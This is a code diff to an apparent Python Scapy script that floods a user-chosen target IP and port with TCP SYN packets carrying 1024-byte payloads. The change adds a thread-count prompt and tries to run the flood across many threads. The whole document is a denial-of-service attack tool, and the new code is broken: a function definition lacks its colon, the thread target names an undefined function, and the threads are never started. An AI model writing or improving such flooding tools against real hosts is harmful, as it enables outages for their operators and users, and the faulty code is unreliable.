@@ -30,6 +30,12 @@ if destip == "":
 destport = input("Target port [80] [1-65500]: ")
 if destport == "":
    destport = 80
+
+try:
+   threads = int(input("Threads [16]: "))
+except ValueError:
+    threads = 16
+
 ip = IP(dst=destip)
 tcp = TCP(sport=RandShort(), dport=int(destport))
 raw = Raw(b"x"*1024)
@@ -54,4 +60,7 @@ print("Interactive mode (TCP-SYN flood)")
 print("")
 print("---> Press CTRL+C to stop the payload!")
 print("-----------------------------------------")
-send(p, loop=1, verbose=0)
+def sendpayload()
+    send(p, loop=1, verbose=0)
+for i in range(0, threads):
+    thr = threading.Thread(target=dos, args=(p,))
